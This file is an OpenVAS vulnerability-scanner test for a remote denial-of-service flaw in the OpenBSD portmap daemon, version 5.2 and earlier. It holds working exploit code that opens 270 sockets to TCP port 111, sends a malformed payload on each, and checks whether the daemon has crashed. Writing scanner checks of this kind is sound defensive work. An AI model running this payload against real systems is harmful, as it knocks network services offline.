###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openbsd_portmap_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# OpenBSD Portmap Remote Denial of Service Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  condition.
  Impact Level: Application";
tag_affected = "OpenBSD version 5.2 and prior";
tag_insight = "The flaw is due to an error when handling multiple RPC requests and can be
  exploited to crash the portmap daemon via specially crafted packets sent to
  TCP port 111.";
tag_solution = "No solution or patch is available as of 26th December, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.openbsd.org/index.html";
tag_summary = "This host is running portmap and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(803091);
  script_version("$Revision: 12 $");
  script_bugtraq_id(56671);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-26 10:49:16 +0530 (Wed, 26 Dec 2012)");
  script_name("OpenBSD Portmap Remote Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/87859");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51299/");
  script_xref(name : "URL" , value : "http://www.securitytracker.com/id/1027814");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/51299");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Nov/168");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2012-11/0169.html");

  script_description(desc);
  script_summary("Check if OpenBSD Portmap service is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("rpc/portmap", 111);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Variable Initialization
nfsPort = 0;
soc = 0;
soc2 = 0;

## Get the RPC PortMapper POrt
nfsPort = get_kb_item("rpc/portmap");
if(!nfsPort){
  nfsPort = 111;
}

## Check the port status
if(!get_port_state(nfsPort)){
  exit(0);
}

##  Open tcp socket
soc = open_sock_tcp(nfsPort);
if(!soc){
  exit(0);
}

close(soc);

## Construct a malformed RPC packet
testmsg = "8========@";

## Send malformed Request Multiple times
## Open socket for every request and dont close it
for (i = 0; i < 270; i++)
{
  ##  Open tcp socket
  soc = open_sock_tcp(nfsPort);
  if(!soc){
    break;
  }

  ## Send the malformed request
  send(socket:soc, data: testmsg);
}

if(soc){
  close(soc);
}

sleep(1);

soc2 = open_sock_tcp(nfsPort);

## If couldn't open soc then portmap is crashed
if(!soc2){
  security_warning(nfsPort);
}

close(soc2);
